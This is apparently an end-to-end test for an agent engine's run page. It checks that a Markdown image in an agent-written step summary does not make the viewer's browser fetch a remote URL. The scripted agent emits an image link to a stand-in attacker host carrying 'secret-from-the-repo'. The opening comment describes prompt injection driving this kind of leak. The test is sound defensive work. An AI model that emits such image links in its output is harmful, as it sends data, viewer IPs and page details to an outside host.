import { writeFileSync } from "node:fs"
import path from "node:path"
import { test, expect, type Engine } from "../fixtures/engine.ts"

// A step summary is what an agent wrote, so it is untrusted: a prompt the
// agent read can make it say anything. The run page renders it as Markdown,
// and a Markdown image there must not make the viewer's browser fetch a URL
// the agent chose, which would leak the data in that URL, the viewer's IP and
// the page they came from.

const GRAPH = `apiVersion: openengine.cc/v1
kind: Graph
name: summarize
plan:
  report:
    agent: claude
    prompt: Reply with one sentence summarizing README.md. Don't run commands or change files.
`

const EXFILTRATION = "https://attacker.example/pixel.png"

async function runs(engine: Engine): Promise<{ runId: string; status: string }[]> {
  const headers = { Authorization: `Bearer ${engine.env.ENGINE_SERVICE_TOKEN}` }
  const response = await fetch(`${engine.url}/api/v1/runs`, { headers })
  expect(response.ok).toBe(true)
  return (await response.json()).runs
}

test("A step summary's Markdown image does not load from a remote host @skip-docs", async ({ engine, terminal, browser }) => {
  test.skip(engine.agentMode !== "stub", "only the scripted agent writes the injected summary on cue")
  test.setTimeout(90_000)
  engine.script({ scenarios: [{ when: "summarizing README.md", steps: [{
    type: "say",
    text: `The README is one heading.\n\n![logo](${EXFILTRATION}?d=secret-from-the-repo)`,
  }] }] })
  writeFileSync(path.join(engine.repository, "summarize.yaml"), GRAPH)
  await terminal.run("engine graph add summarize.yaml")
  await terminal.run("engine repo trust")
  await terminal.type("engine graph run summarize")
  await terminal.press("Enter")
  expect(await terminal.waitForPrompt({ timeout: 60_000 })).toBe(0)
  const [run] = await runs(engine)
  expect(run?.status).toBe("completed")

  const context = await browser.newContext({
    baseURL: engine.url,
    extraHTTPHeaders: { Authorization: `Bearer ${engine.env.ENGINE_SERVICE_TOKEN}` },
  })
  const fetched: string[] = []
  await context.route("https://attacker.example/**", (route) => {
    fetched.push(route.request().url())
    return route.fulfill({ status: 204 })
  })
  const page = await context.newPage()
  try {
    await page.goto(`/runs/${encodeURIComponent(run!.runId)}`)
    // The summary is on screen, rendered as Markdown.
    await expect(page.locator(".step-summary")).toContainText("The README is one heading.")
    // Give an <img> the time it would take to request its source.
    await page.waitForLoadState("networkidle")
    expect(fetched, "the browser fetched an image URL the agent wrote").toEqual([])
    await expect(page.locator(`.step-summary img[src^="${EXFILTRATION}"]`)).toHaveCount(0)
  } finally {
    await context.close()
  }
})
